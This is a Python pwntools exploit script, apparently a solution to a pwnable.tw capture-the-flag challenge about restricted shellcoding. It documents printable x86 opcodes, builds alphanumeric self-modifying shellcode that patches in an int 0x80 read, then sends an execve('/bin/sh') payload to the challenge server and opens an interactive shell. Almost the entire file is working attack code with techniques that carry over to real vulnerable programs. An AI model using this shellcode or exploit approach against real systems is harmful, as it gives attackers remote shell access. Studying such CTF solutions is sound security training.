###shellcoding with limits

from pwn import *

###Useful Commands
'''
H:  dec eax
P:  push eax

C:  inc ebx
K:  dec ebx
S:  push ebx

I:  dec ecx
Y:  pop ecx

B:  inc edx

F:  inc esi
N:  dec esi
V:  push esi

O:  dec edi
W:  push edi

U:  push ebp
'''

###Payload for read
#edx controlled by last input char, set to 'N'->0x804889f
#[R]        push edx            -> 0x804889f
#[h1111]    push 0x31313131     *Used to pad R to element
#[Y]        pop ecx
#[Y]        pop ecx
#[I]        dec ecx*28          -> 0x8048883
#[1He]      xor [eax+0x65],ecx  *'N'^0x83 = 0xcd
#[I]        dec ecx*28          -> 0x8048867
#[1Hf]      xor [eax+0x66],ecx  *'o'^0x88^0x67 = 0x80
#[P]        push eax            -> 0x324f6e4d
#[Y]        pop ecx
#[5ZnO2]    xor eax, 0x324f6e5a -> 0x17
#[H]        dec eax*20
payload_r = 'Rh1111YY'+'I'*28+'1He'+'I'*28+'1Hf'+'PY5ZnO2'+'H'*20
payload_r = payload_r.rjust(0x65,'N')+'NoN'

###Payload for execve
padding = b'\x90'*0x68      #Align shellcode after read shellcode
shellcode = asm('''
                push 0x0068732F
                push 0x6E69622F
                mov eax, 0xb
                mov ebx, esp
                xor ecx, ecx
                xor edx, edx
                xor esi, esi
                int 0x80
                ''')
payload_s = padding+shellcode

###Exploit
r = remote('chall.pwnable.tw',10301)
r.sendline(payload_r)
r.sendline(payload_s)
r.interactive()
